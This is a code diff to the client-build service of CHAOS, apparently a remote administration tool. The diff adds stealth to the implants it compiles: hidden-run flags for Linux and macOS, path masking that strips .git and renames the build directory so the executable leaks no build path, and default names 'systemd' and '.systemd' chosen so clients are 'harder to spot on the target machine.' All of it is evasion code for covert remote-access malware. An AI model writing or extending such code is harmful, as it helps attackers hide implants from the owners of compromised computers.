@@ -22,6 +22,7 @@ import (
 	syscallCmd "github.com/tiagorlampert/CHAOS/services/client/syscall_cmd"
 	"os"
 	"os/exec"
+	"path/filepath"
 	"strings"
 	"sync"
 )
@@ -32,7 +33,10 @@ const (
 	configFileName       = "config.json"
 	mainFileName         = "main.go"
 	clientConfigFilepath = "app/utils/config.go"
-	buildStr             = `go build -ldflags="%s -s -w -X 'main.Version=%s' -extldflags -static" -o ../../temp/%s main.go`
+	buildStr             = `go build -ldflags="%s -s -w -X 'main.Version=%s' -extldflags -static" -o ../../../temp/%s .`
+	runtimeDirName       = `runtime`
+	hiddenLinuxFilename  = "systemd"
+	hiddenMacFilename    = ".systemd"
 )
 
 type clientService struct {
@@ -172,10 +176,15 @@ func (c clientService) BuildClient(input BuildClientBinaryInput) (string, error)
 	}
 	defer utils.RemoveDir(buildPath)
 
-	filename := buildFilename(input.OSTarget, input.GetFilename())
+	buildPackage, err := maskRuntimeDirectory(buildPath, input.MaskName)
+	if err != nil {
+		return "", err
+	}
+
+	filename := buildFilename(input.OSTarget, input.GetFilename(), input.RunHidden)
 	buildCmd := fmt.Sprintf(
 		getEnvVarBuild(goos, goarch)+" "+buildStr,
-		getRunHiddenBuildParam(input.OSTarget, input.RunHidden),
+		getBuildFlags(input.OSTarget, input.RunHidden, input.MaskName),
 		c.AppVersion,
 		filename,
 	)
@@ -191,7 +200,7 @@ func (c clientService) BuildClient(input BuildClientBinaryInput) (string, error)
 		cmd = exec.Command("sh", "-c", buildCmd)
 	}
 
-	cmd.Dir = buildPath
+	cmd.Dir = buildPackage
 
 	outputErr, err := cmd.CombinedOutput()
 	if err != nil {
@@ -291,27 +300,53 @@ func (c clientService) PrepareBuildSession(input BuildClientBinaryInput) (string
 		return "", err
 	}
 
+	runtimeDir := buildPath + runtimeDirName + "/"
+	err = utils.CopyDir(clientBaseDir, runtimeDir)
+	if err != nil {
+		return "", err
+	}
+
 	clientConfiguration, err := c.BuildClientConfiguration(input)
 	if err != nil {
 		return "", err
 	}
 
-	err = c.WriteClientConfigurationFile(clientConfiguration, buildPath, sessionFilename)
+	err = c.WriteClientConfigurationFile(clientConfiguration, runtimeDir, sessionFilename)
 	if err != nil {
 		return "", err
 	}
 
-	err = c.ReplaceClientConfigurationFile(clientConfiguration, buildPath, sessionFilename)
+	err = c.ReplaceClientConfigurationFile(clientConfiguration, runtimeDir, sessionFilename)
 	if err != nil {
 		return "", err
 	}
 
-	err = c.ReplaceMainConfigurationFile(buildPath, sessionFilename)
+	err = c.ReplaceMainConfigurationFile(runtimeDir, sessionFilename)
 	if err != nil {
 		return "", err
 	}
 
 	return buildPath, nil
+}
+
+// maskRuntimeDirectory renames the copy compiled into the binary to an anonymous
+// directory, so the build path cannot be read from the executable.
+// It returns the directory the build must run in.
+func maskRuntimeDirectory(buildPath string, maskName bool) (string, error) {
+	runtimeDir := filepath.Join(buildPath, runtimeDirName)
+	if !maskName {
+		return runtimeDir, nil
+	}
+
+	if err := os.RemoveAll(filepath.Join(runtimeDir, ".git")); err != nil {
+		return "", err
+	}
+
+	maskedDir := filepath.Join(buildPath, uuid.New().String())
+	if err := os.Rename(runtimeDir, maskedDir); err != nil {
+		return "", err
+	}
+	return maskedDir, nil
 }
 
 func getEnvVarBuild(goos, goarch string) string {
@@ -321,16 +356,25 @@ func getEnvVarBuild(goos, goarch string) string {
 	return fmt.Sprintf("CGO_ENABLED=0 GOOS=%s GOARCH=%s", goos, goarch)
 }
 
-func getRunHiddenBuildParam(osType system.OSType, hidden bool) string {
-	if hidden && osType == system.Windows {
-		return "-H=windowsgui"
+func getBuildFlags(osType system.OSType, runHidden, maskName bool) string {
+	var flags []string
+	if runHidden {
+		switch osType {
+		case system.Windows:
+			flags = append(flags, "-H=windowsgui")
+		case system.Linux, system.Darwin:
+			flags = append(flags, "-X 'main.RunHidden=true'")
+		}
 	}
-	return ""
+	if maskName && (osType == system.Linux || osType == system.Darwin) {
+		flags = append(flags, "-X 'main.MaskName=true'")
+	}
+	return strings.Join(flags, " ")
 }
 
-func buildFilename(os system.OSType, filename string) string {
+func buildFilename(os system.OSType, filename string, runHidden bool) string {
 	if len(strings.TrimSpace(filename)) <= 0 {
-		filename = uuid.New().String()
+		filename = defaultBuildFilename(os, runHidden)
 	}
 	switch os {
 	case system.Windows:
@@ -338,4 +382,18 @@ func buildFilename(os system.OSType, filename string) string {
 	default:
 		return filename
 	}
+}
+
+// defaultBuildFilename picks an inconspicuous name so hidden clients are
+// harder to spot on the target machine.
+func defaultBuildFilename(os system.OSType, runHidden bool) string {
+	if runHidden {
+		switch os {
+		case system.Linux:
+			return hiddenLinuxFilename
+		case system.Darwin:
+			return hiddenMacFilename
+		}
+	}
+	return uuid.New().String()
 }
